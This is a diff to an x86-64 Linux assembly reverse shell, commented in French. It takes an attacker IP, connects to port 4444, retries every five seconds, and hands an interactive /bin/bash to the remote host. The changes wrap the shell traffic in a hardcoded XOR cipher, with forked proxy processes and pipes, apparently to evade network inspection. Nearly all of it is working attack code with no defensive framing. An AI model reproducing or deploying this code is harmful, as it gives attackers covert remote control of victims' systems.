@@ -1,31 +1,36 @@
 section .data
-    ; Commandes et arguments
+    ; Configuration du chiffrement XOR
+    xor_key      db 0x41, 0x42, 0x43, 0x44
+    
+    ; Commandes et arguments pour le fancy shell
     command      db '/bin/bash',0
     bash_i       db '-i',0
     bash_args    dq command, bash_i, 0
+    
+    ; Configuration réseau
+    timespec     dq 5, 0          ; 5 secondes entre les tentatives    
+    port_num     dw 4444          ; Port fixe
     
     ; Messages d'erreur
     err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
     err_ip_format db 'Error: Invalid IP format',10,0
     err_socket   db 'Error: Socket creation failed',10,0
     err_connect  db 'Error: Connection failed',10,0
-    timespec     dq 5, 0          ; 5 secondes entre les tentatives    
-    ; Port fixe
-    port_num     dw 4444
 
 section .bss
     ip_bytes     resd 1           ; IP en format réseau
     port_bytes   resw 1           ; Port en format réseau
     sockaddr     resb 16          ; Structure sockaddr_in
     envp         resq 256         ; Tableau des variables d'environnement
+    buffer       resb 8192        ; Buffer pour le chiffrement
+    pipe_read    resd 1           ; Descripteur de lecture du pipe
+    pipe_write   resd 1           ; Descripteur d'écriture du pipe
 
 section .text
     global _start
 
 ;----------------------------------------------------------
 ; Validation et conversion de l'IP
-; Entrée : rdi = pointeur vers la chaîne IP
-; Sortie : rax = 1 (succès), 0 (erreur)
 ;----------------------------------------------------------
 validate_and_parse_ip:
     push rbp
@@ -62,7 +67,7 @@ validate_and_parse_ip:
     jmp .parse_loop
 
 .store_octet:
-    cmp bl, 3                     ; Vérifier nombre d'octets
+    cmp bl, 3
     jae .invalid
     
     shl r12d, 8
@@ -73,12 +78,11 @@ validate_and_parse_ip:
     jmp .parse_loop
 
 .end_parse:
-    cmp bl, 3                     ; Doit avoir exactement 3 points (4 octets)
+    cmp bl, 3
     jne .invalid
     
     shl r12d, 8
     or r12d, r13d
-    ; Convertir en format réseau (big-endian)
     mov eax, r12d
     bswap eax
     mov [ip_bytes], eax
@@ -94,8 +98,51 @@ validate_and_parse_ip:
     pop rbp
     ret
 
+;---------------------------------------------------------
+;                       XOR Cipher 
+;---------------------------------------------------------
+xor_crypt:
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push r12
+    push r13
+
+    mov r10, rdi                  ; buffer
+    mov r11, rsi                  ; longueur
+    mov r12d, edx                 ; clé XOR
+    xor r13, r13                  ; index
+
+.loop:
+    cmp r13, r11
+    jae .end
+
+    mov ecx, r13d
+    and ecx, 3
+    shl ecx, 3
+
+    mov eax, r12d
+    shr eax, cl
+    and al, 0xFF
+
+    mov bl, [r10 + r13]
+    xor bl, al
+    mov [r10 + r13], bl
+
+    inc r13
+    jmp .loop
+
+.end:
+    pop r13
+    pop r12
+    pop rbx
+    pop rbp
+    ret
+
+;----------------------------------------------------------
+; Gestion des arguments et environnement
+;----------------------------------------------------------
 jmp_arg:
-    ; Boucle sur les arguments présents dans la stack jusqu'à arriver à NULL
     mov rax, [rbx]
     add rbx, 8
     test rax, rax
@@ -105,7 +152,6 @@ jmp_arg:
 jmp_envp:
     lea rdi, [envp]
 env_loop:
-    ; Boucle sur les variables d'environnement présentes dans la stack jusqu'à arriver à NULL
     mov rax, [rbx]
     test rax, rax
     je done
@@ -114,8 +160,107 @@ env_loop:
     add rbx, 8
     jmp env_loop
 done:
-    ; Fin du tableau avec NULL
     mov qword [rdi], 0
+    ret
+
+;----------------------------------------------------------
+; Proxy de chiffrement - Thread pour socket vers bash
+;----------------------------------------------------------
+proxy_socket_to_bash:
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push r12
+    push r13
+    push r14
+
+    mov r12, rdi                  ; socket fd
+    mov r13, rsi                  ; pipe write fd
+
+.read_loop:
+    ; Lire du socket
+    mov rax, 0                    ; sys_read
+    mov rdi, r12
+    lea rsi, [buffer]
+    mov rdx, 8192
+    syscall
+
+    test rax, rax
+    jle .end
+
+    mov r14, rax                  ; taille lue
+
+    ; Déchiffrer
+    lea rdi, [buffer]
+    mov rsi, r14
+    mov edx, [xor_key]
+    call xor_crypt
+
+    ; Écrire vers bash
+    mov rax, 1                    ; sys_write
+    mov rdi, r13
+    lea rsi, [buffer]
+    mov rdx, r14
+    syscall
+
+    jmp .read_loop
+
+.end:
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
+    pop rbp
+    ret
+
+;----------------------------------------------------------
+; Proxy de chiffrement - Thread pour bash vers socket
+;----------------------------------------------------------
+proxy_bash_to_socket:
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push r12
+    push r13
+    push r14
+
+    mov r12, rdi                  ; pipe read fd
+    mov r13, rsi                  ; socket fd
+
+.read_loop:
+    ; Lire de bash
+    mov rax, 0                    ; sys_read
+    mov rdi, r12
+    lea rsi, [buffer]
+    mov rdx, 8192
+    syscall
+
+    test rax, rax
+    jle .end
+
+    mov r14, rax                  ; taille lue
+
+    ; Chiffrer
+    lea rdi, [buffer]
+    mov rsi, r14
+    mov edx, [xor_key]
+    call xor_crypt
+
+    ; Écrire vers socket
+    mov rax, 1                    ; sys_write
+    mov rdi, r13
+    lea rsi, [buffer]
+    mov rdx, r14
+    syscall
+
+    jmp .read_loop
+
+.end:
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
+    pop rbp
     ret
 
 ;----------------------------------------------------------
@@ -140,7 +285,7 @@ _start:
 
     ; Convertir le port en format réseau
     mov ax, [port_num]
-    xchg al, ah                   ; Conversion en big-endian
+    xchg al, ah
     mov [port_bytes], ax
 
 connection_loop:
@@ -148,87 +293,181 @@ connection_loop:
     mov rax, 41                   ; sys_socket
     mov rdi, 2                    ; AF_INET
     mov rsi, 1                    ; SOCK_STREAM
-    xor rdx, rdx                  ; Protocole par défaut
+    xor rdx, rdx
     syscall 
     
     test rax, rax
     js socket_error
-    mov r8, rax                   ; Sauvegarder le socket fd
+    mov r8, rax                   ; Socket fd
 
-    ; Configuration de la structure sockaddr_in
+    ; Configuration sockaddr_in
     lea rdi, [sockaddr]
-    mov word [rdi], 2             ; AF_INET
+    mov word [rdi], 2
     mov ax, [port_bytes]
-    mov word [rdi+2], ax          ; Port en big-endian
+    mov word [rdi+2], ax
     mov eax, [ip_bytes]
-    mov dword [rdi+4], eax        ; IP en big-endian
-    mov qword [rdi+8], 0          ; Padding
+    mov dword [rdi+4], eax
+    mov qword [rdi+8], 0
 
     ; Connexion
     mov rax, 42                   ; sys_connect
-    mov rdi, r8                   ; socket fd
-    lea rsi, [sockaddr]           ; sockaddr_in
-    mov rdx, 16                   ; addrlen
+    mov rdi, r8
+    lea rsi, [sockaddr]
+    mov rdx, 16
     syscall
     
     test rax, rax
     js connect_error
 
-    ; Redirection des flux standard (stdin, stdout, stderr)
-    xor rsi, rsi
-.dup_loop:
-    mov rax, 33                   ; sys_dup2
-    mov rdi, r8                   ; socket fd
-    ; rsi contient déjà 0, 1, ou 2
+    ; Créer pipes pour communiquer avec bash
+    ; Pipe 1: nous -> bash
+    sub rsp, 8
+    mov rax, 22                   ; sys_pipe
+    mov rdi, rsp
     syscall
-    inc rsi
-    cmp rsi, 3
-    jne .dup_loop
+    test rax, rax
+    js exit_program
+    
+    mov eax, [rsp]                ; read end
+    mov [pipe_read], eax
+    mov eax, [rsp+4]              ; write end  
+    mov [pipe_write], eax
+    add rsp, 8
 
-    ; Exécution du shell
-    mov rax, 59                   ; sys_execve
-    lea rdi, [command]
-    lea rsi, [bash_args]
-    lea rdx, [envp]
+    ; Pipe 2: bash -> nous
+    sub rsp, 8
+    mov rax, 22                   ; sys_pipe
+    mov rdi, rsp
+    syscall
+    test rax, rax
+    js exit_program
+    
+    mov r9d, [rsp]                ; read end (bash output)
+    mov r10d, [rsp+4]             ; write end (bash input)
+    add rsp, 8
+
+    ; Fork pour créer le processus bash
+    mov rax, 57                   ; sys_fork
+    syscall
+    test rax, rax
+    jz .bash_process
+    js exit_program
+
+    ; Processus parent - gestion des proxies
+    mov r11, rax                  ; PID bash
+
+    ; Fermer les descripteurs inutiles
+    mov rax, 3
+    mov rdi, [pipe_read]
+    syscall
+    mov rax, 3
+    mov rdi, r10
     syscall
 
-    ; En cas d'échec d'execve
+    ; Fork pour le proxy socket->bash
+    mov rax, 57                   ; sys_fork
+    syscall
+    test rax, rax
+    jz .proxy_to_bash
+    js exit_program
+
+    ; Processus principal - proxy bash->socket
+    mov rdi, r9                   ; read from bash
+    mov rsi, r8                   ; write to socket
+    call proxy_bash_to_socket
     jmp exit_program
+
+.proxy_to_bash:
+    ; Processus enfant - proxy socket->bash
+    mov rdi, r8                   ; read from socket
+    mov rsi, [pipe_write]         ; write to bash
+    call proxy_socket_to_bash
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+.bash_process:
+    ; Processus bash - rediriger stdin/stdout vers les pipes
+    
+    ; stdin = pipe_read
+    mov rax, 33                   ; sys_dup2
+    mov rdi, [pipe_read]
+    mov rsi, 0
+    syscall
+    
+    ; stdout = pipe write end (r10)
+    mov rax, 33                   ; sys_dup2
+    mov rdi, r10
+    mov rsi, 1
+    syscall
+    
+    ; stderr = pipe write end (r10)
+    mov rax, 33                   ; sys_dup2
+    mov rdi, r10
+    mov rsi, 2
+    syscall
+
+    ; Fermer les descripteurs inutiles
+    mov rax, 3
+    mov rdi, [pipe_read]
+    syscall
+    mov rax, 3
+    mov rdi, [pipe_write]
+    syscall
+    mov rax, 3
+    mov rdi, r9
+    syscall
+    mov rax, 3
+    mov rdi, r10
+    syscall
+    mov rax, 3
+    mov rdi, r8
+    syscall
+
+    ; Lancer bash interactif
+    mov rax, 59                   ; sys_execve
+    lea rdi, [command]            ; /bin/bash
+    lea rsi, [bash_args]          ; ["/bin/bash", "-i", NULL]
+    lea rdx, [envp]               ; variables d'environnement
+    syscall
+
+    ; Si execve échoue
+    mov rax, 60
+    mov rdi, 1
+    syscall
 
 ;----------------------------------------------------------
 ; Gestion des erreurs
 ;----------------------------------------------------------
 usage_error:
-    mov rax, 1                    ; sys_write
-    mov rdi, 2                    ; stderr
+    mov rax, 1
+    mov rdi, 2
     lea rsi, [err_usage]
     mov rdx, 30
     syscall
     jmp exit_program
 
 ip_error:
-    mov rax, 1                    ; sys_write
-    mov rdi, 2                    ; stderr
+    mov rax, 1
+    mov rdi, 2
     lea rsi, [err_ip_format]
     mov rdx, 25
     syscall
     jmp exit_program
 
 socket_error:
-    mov rax, 1                    ; sys_write
-    mov rdi, 2                    ; stderr
+    mov rax, 1
+    mov rdi, 2
     lea rsi, [err_socket]
     mov rdx, 28
     syscall
     jmp exit_program
 
 connect_error:
-    ; Fermer le socket avant de réessayer
-    mov rax, 3                    ; sys_close
+    mov rax, 3
     mov rdi, r8
     syscall
 
-    ; Attendre avant de réessayer
     mov rax, 35                   ; sys_nanosleep
     lea rdi, [timespec]
     xor rsi, rsi
@@ -236,6 +475,6 @@ connect_error:
     jmp connection_loop
 
 exit_program:
-    mov rax, 60                   ; sys_exit
-    mov rdi, 1                    ; code de sortie
+    mov rax, 60
+    xor rdi, rdi
     syscall
